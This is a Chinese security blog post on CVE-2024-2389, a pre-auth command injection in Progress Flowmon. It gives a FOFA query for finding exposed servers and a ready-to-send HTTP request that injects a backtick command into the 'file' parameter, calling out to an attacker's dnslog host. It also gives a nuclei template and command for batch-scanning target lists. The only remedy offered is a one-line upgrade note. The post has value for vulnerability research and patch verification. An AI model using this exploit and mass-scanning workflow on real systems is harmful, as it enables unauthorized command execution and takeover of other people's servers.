#  CVE-2024-2389   
原创 fgz  AI与网安   2024-04-17 07:10  
  
免  
责  
申  
明  
：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**  
  
  
  
01  
  
—  
  
漏洞名称  
  
  
  
Progress Flowmon   
命令注入  
漏洞  
  
  
  
  
02  
  
—  
  
漏洞影响  
  
  
Progress Flowmon 11.X 12.x版本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOJXGbmg2VibZEQJtRafbUv04dREaR19p8I4Vg2Qa1A0xjaicTykrpTKyP7d7Os0H12q0rt0L76oIbw/640?wx_fmt=png&from=appmsg "")  
  
  
  
03  
  
—  
  
漏洞描述  
  
  
Progress Flowmon 是一个网络性能监控工具平台。2024年4月互联网上披露其存在前台命令注入漏洞，攻击者可利用该漏洞执行任意命令，控制服务器。  
  
  
04  
  
—  
  
FOFA搜索语句  
  
  
```
body="Flowmon-Web-Interface"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOJXGbmg2VibZEQJtRafbUv0j6HTCW2lZKZTxlKicWpIPvMf26afj22k6kY9UXTbp3DyfG1SlzuAhicA/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
  
向靶场发送如下数据包，其中  
ping+  
dnslog地址需要修改成自己dnslog地址  
```
GET /service.pdfs/confluence?lang=en&file=`ping+dnslog地址` HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOJXGbmg2VibZEQJtRafbUv0ve5eUVyicAiaD8AbKPuh49rafCLeZBJIRX3jibJrEj4Fr5sJiaIjYX9HZg/640?wx_fmt=png&from=appmsg "")  
  
漏洞复现成功  
  
  
  
06  
  
—  
  
批量扫描 poc  
  
  
nuclei poc文件内容如下  
```
id: CVE-2024-2389
info:
  name: Progress Flowmon 命令注入漏洞
  author: fgz
  severity: high
  description: |
    Progress Flowmon 是一个网络性能监控工具平台。2024年4月互联网上披露其存在前台命令注入漏洞，攻击者可利用该漏洞执行任意命令，控制服务器。
  reference:
    - https://support.kemptechnologies.com/hc/en-us/articles/24878235038733-CVE-2024-2389-Flowmon-critical-security-vulnerability
  metadata:
    verified: true
    fofa-query: body="Flowmon-Web-Interface"
  tags: cve,cve2024,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/service.pdfs/confluence?lang=en&file=`ping+{{interactsh-url}}`"

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, "dns")
        condition: and
```  
  
运行POC  
```
nuclei.exe -t mypoc/cve/CVE-2024-2389.yaml -l data\1.txt
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BOJXGbmg2VibZEQJtRafbUv0JjmM5iaNcGib9mXTd78AG538xW6V79KysvohsgY5I6GpCs3uI2p2uApw/640?wx_fmt=png&from=appmsg "")  
  
  
  
07  
  
—  
  
修复建议  
  
  
升级到最新版本。  
  
  
